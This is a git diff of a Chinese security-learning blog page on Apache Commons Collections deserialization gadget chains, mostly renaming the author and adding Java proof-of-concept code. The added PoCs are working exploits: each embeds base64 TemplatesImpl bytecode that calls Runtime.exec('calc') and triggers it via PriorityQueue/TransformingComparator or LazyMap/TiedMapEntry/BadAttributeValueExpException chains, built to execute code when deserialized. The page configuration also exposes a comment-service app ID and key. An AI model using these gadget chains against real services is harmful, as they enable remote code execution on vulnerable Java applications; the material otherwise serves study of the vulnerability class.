@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">CC链学习-下 | Pp1ove</title>
+  <title itemprop="name">CC链学习-下 | Yasax1</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -34,9 +34,9 @@
   mashiro_option.email_name = "";
   mashiro_option.cookie_version_control = "";
   mashiro_option.qzone_autocomplete = false;
-  mashiro_option.site_name = "さくら荘そのPp1ove";
-  mashiro_option.author_name = "Pp1ove";
-  mashiro_option.site_url = "https://pp1ove.github.io/";
+  mashiro_option.site_name = "さくら荘そのYasax1";
+  mashiro_option.author_name = "Yasax1";
+  mashiro_option.site_url = "https://Yasax1.github.io/";
   mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
   mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
   mashiro_option.mathjax = "0";
@@ -78,7 +78,7 @@
   <figure id="centerbg" class="centerbg">
     <div class="focusinfo no-select">
       <div class="header-tou">
-        <a href="https://pp1ove.github.io/">
+        <a href="https://Yasax1.github.io/">
           <img src="/img/custom/head.jpg">
         </a>
       </div>
@@ -92,7 +92,7 @@
             
               
                 <li>
-                  <a href="http://github.com/Pp1ove" target="_blank" class="social-github" title="github">
+                  <a href="http://github.com/Yasax1" target="_blank" class="social-github" title="github">
                     <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/social/github.png">
                   </a>
                 </li>
@@ -161,7 +161,7 @@
         <span class="logolink moe-mashiro">
           <a href="/">
             <span class="sakurasono">さくら荘その</span>
-            <span class="shironeko">Pp1ove</span>
+            <span class="shironeko">Yasax1</span>
           </a>
         </span>
       </span>
@@ -391,6 +391,87 @@
 <h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
+
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+
+import javax.xml.transform.Templates;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+
+public class CC41 {
+
+    public static void main(String[] args) throws  Exception {
+
+
+        //字节码
+        byte[] code = Base64.decode(&quot;yv66vgAAADMALgoABgAgCgAhACIIACMKACEAJAcAJQcAJgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTFRlbXBsYXRlc0ltcGw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgEAB3J1bnRpbWUBABNMamF2YS9sYW5nL1J1bnRpbWU7BwAoAQAKU291cmNlRmlsZQEAElRlbXBsYXRlc0ltcGwuamF2YQwAGQAaBwApDAAqACsBAARjYWxjDAAsAC0BAA1UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAALAAsAAAAgAAMAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAEAARAAIAEgAAAAQAAQATAAEABwAUAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAAOAAsAAAAqAAQAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAFQAWAAIAAAABABcAGAADABIAAAAEAAEAEwABABkAGgACAAkAAABQAAIAAgAAABAqtwABuAACTCsSA7YABFexAAAAAgAKAAAAEgAEAAAAEQAEABIACAATAA8AFAALAAAAFgACAAAAEAAMAA0AAAAIAAgAGwAcAAEAEgAAAAQAAQAdAAEAHgAAAAIAHw==&quot;);
+
+        //反射设置 Field
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{code});
+        setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
+        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
+        //TransformingComparator 实例
+        TransformingComparator comparator = new TransformingComparator(instantiateTransformer);
+
+        //PriorityQueue 实例
+        PriorityQueue priorityQueue = new PriorityQueue(2);
+
+        //先设置为正常变量值，后面可以通过setFieldValue修改
+        priorityQueue.add(1);
+        priorityQueue.add(1);
+
+        //反射设置 Field
+        Object[] objects = new Object[]{TrAXFilter.class, TrAXFilter.class};
+        setFieldValue(priorityQueue, &quot;comparator&quot;, comparator);
+        setFieldValue(priorityQueue, &quot;queue&quot;, objects);
+
+
+        //序列化
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(priorityQueue);
+        oos.flush();
+        oos.close();
+
+        //测试反序列化
+        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        ois.readObject();
+        ois.close();
+
+
+
+    }
+
+        //反射设置 Field
+        public static void setFieldValue (Object object, String fieldName, Object value){
+            try {
+                Field field = object.getClass().getDeclaredField(fieldName);
+                field.setAccessible(true);
+                field.set(object, value);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+
+    }
+</code></pre>
+<h3 id="JDK1-8可用"><a href="#JDK1-8可用" class="headerlink" title="JDK1.8可用"></a>JDK1.8可用</h3><pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import org.apache.bcel.util.ClassLoader;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -399,8 +480,11 @@ import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.LazyMap;
 import org.apache.commons.collections.map.TransformedMap;
 import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections4.keyvalue.TiedMapEntry;
 import org.jboss.util.Base64;
+import org.jboss.util.Null;
 
+import javax.management.BadAttributeValueExpException;
 import javax.xml.transform.Templates;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -411,55 +495,50 @@ import java.lang.reflect.Field;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
 import java.util.HashMap;
+import java.util.Hashtable;
 import java.util.Map;
-public class CC32 {
+public class CC31 {
 
     public static void main(String[] args) throws Exception{
 
-            //字节码
-            byte[] code = Base64.decode(&quot;yv66vgAAADMALgoABgAgCgAhACIIACMKACEAJAcAJQcAJgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTFRlbXBsYXRlc0ltcGw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgEAB3J1bnRpbWUBABNMamF2YS9sYW5nL1J1bnRpbWU7BwAoAQAKU291cmNlRmlsZQEAElRlbXBsYXRlc0ltcGwuamF2YQwAGQAaBwApDAAqACsBAARjYWxjDAAsAC0BAA1UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAALAAsAAAAgAAMAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAEAARAAIAEgAAAAQAAQATAAEABwAUAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAAOAAsAAAAqAAQAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAFQAWAAIAAAABABcAGAADABIAAAAEAAEAEwABABkAGgACAAkAAABQAAIAAgAAABAqtwABuAACTCsSA7YABFexAAAAAgAKAAAAEgAEAAAAEQAEABIACAATAA8AFAALAAAAFgACAAAAEAAMAA0AAAAIAAgAGwAcAAEAEgAAAAQAAQAdAAEAHgAAAAIAHw==&quot;);
-
-            //反射设置 Field
-            TemplatesImpl templates = new TemplatesImpl();
-            setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{code});
-            setFieldValue(templates, &quot;_name&quot;, &quot;Yasax1&quot;);
-            setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl()); 
-
-            //Transformer数组
-            Transformer[] transformers = new Transformer[] {
-                    new ConstantTransformer(TrAXFilter.class),
-                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
-            };
-
-            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
-
-            //LazyMap实例
-            Map uselessMap = new HashMap();
-            Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);
-
-            //反射获取AnnotationInvocationHandler实例
-            Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
-            Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
-            constructor.setAccessible(true);
-            InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
-
-            //动态代理类，为了触发 AnnotationInvocationHandler#invoke
-            Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);
-            InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);
+        //字节码
+       byte[] code = Base64.decode(&quot;yv66vgAAADMALgoABgAgCgAhACIIACMKACEAJAcAJQcAJgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTFRlbXBsYXRlc0ltcGw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgEAB3J1bnRpbWUBABNMamF2YS9sYW5nL1J1bnRpbWU7BwAoAQAKU291cmNlRmlsZQEAElRlbXBsYXRlc0ltcGwuamF2YQwAGQAaBwApDAAqACsBAARjYWxjDAAsAC0BAA1UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAALAAsAAAAgAAMAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAEAARAAIAEgAAAAQAAQATAAEABwAUAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAAOAAsAAAAqAAQAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAFQAWAAIAAAABABcAGAADABIAAAAEAAEAEwABABkAGgACAAkAAABQAAIAAgAAABAqtwABuAACTCsSA7YABFexAAAAAgAKAAAAEgAEAAAAEQAEABIACAATAA8AFAALAAAAFgACAAAAEAAMAA0AAAAIAAgAGwAcAAEAEgAAAAQAAQAdAAEAHgAAAAIAHw==&quot;);
 
 
-            //序列化
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            ObjectOutputStream oos = new ObjectOutputStream(baos);
-            oos.writeObject(handler1);
-            oos.flush();
-            oos.close();
+        //反射设置 Field
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates, &quot;_bytecodes&quot;,new byte[][]{code});
+        setFieldValue(templates, &quot;_name&quot;, &quot;Yasax1&quot;);
+        setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());
+        //Transformer数组
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
+        };
 
-            //测试反序列化
-            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
-            ObjectInputStream ois = new ObjectInputStream(bais);
-            ois.readObject();
-            ois.close();
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        //LazyMap实例
+        HashMap innermap = new HashMap();
+        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);
+
+        TiedMapEntry tiedmap = new TiedMapEntry(map,123);
+        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
+        Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);
+        val.setAccessible(true);
+        val.set(poc,tiedmap);
+        //序列化
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(poc);
+        oos.flush();
+        oos.close();
+
+        //测试反序列化
+        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        ois.readObject();
+        ois.close();
     }
 
 
@@ -568,13 +647,13 @@ import java.util.PriorityQueue;
 
 public class CC21{
 
-    public static void main(String[] args) {
+    public static void main(String[] args) throws Exception {
 
-        try{
+
             //字节码
             byte[] code = Base64.decode(&quot;yv66vgAAADMALgoABgAgCgAhACIIACMKACEAJAcAJQcAJgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTFRlbXBsYXRlc0ltcGw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgEAB3J1bnRpbWUBABNMamF2YS9sYW5nL1J1bnRpbWU7BwAoAQAKU291cmNlRmlsZQEAElRlbXBsYXRlc0ltcGwuamF2YQwAGQAaBwApDAAqACsBAARjYWxjDAAsAC0BAA1UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAALAAsAAAAgAAMAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAEAARAAIAEgAAAAQAAQATAAEABwAUAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAAOAAsAAAAqAAQAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAFQAWAAIAAAABABcAGAADABIAAAAEAAEAEwABABkAGgACAAkAAABQAAIAAgAAABAqtwABuAACTCsSA7YABFexAAAAAgAKAAAAEgAEAAAAEQAEABIACAATAA8AFAALAAAAFgACAAAAEAAMAA0AAAAIAAgAGwAcAAEAEgAAAAQAAQAdAAEAHgAAAAIAHw==&quot;);
 
-            //反射设置 Field
+        //反射设置 Field
             TemplatesImpl templates = new TemplatesImpl();
             setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{code});
             setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
@@ -588,14 +667,16 @@ public class CC21{
 
             //PriorityQueue 实例
             PriorityQueue priorityQueue = new PriorityQueue(2);
+
             //先设置为正常变量值，后面可以通过setFieldValue修改
             priorityQueue.add(1);
             priorityQueue.add(1);
 
             //反射设置 Field
             Object[] objects = new Object[]{templates, templates};
-            setFieldValue(priorityQueue, &quot;queue&quot;, objects);
             setFieldValue(priorityQueue, &quot;comparator&quot;, comparator);
+            setFieldValue(priorityQueue, &quot;queue&quot;, objects);
+
 
             //序列化
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
@@ -610,10 +691,10 @@ public class CC21{
             ois.readObject();
             ois.close();
 
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+
+
     }
+
 
     //反射设置 Field
     public static void setFieldValue(Object object, String fieldName, Object value) {
@@ -880,7 +961,7 @@ public class CC4 {
   
   <div class="outer">
     <div id="footer-info" class="inner">
-      &copy; 2021 Pp1ove<br>
+      &copy; 2021 Yasax1<br>
       powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
@@ -1035,11 +1116,11 @@ $(document).ready(function() {
   <div class="m-avatar">
     <img src="/img/custom/head.jpg">
   </div>
-  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">さくら荘そのPp1ove</p>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">さくら荘そのYasax1</p>
   <p style="text-align: center; word-spacing: 20px;">
     
       
-        <a href="http://github.com/Pp1ove" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
+        <a href="http://github.com/Yasax1" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
       
     
   </p>
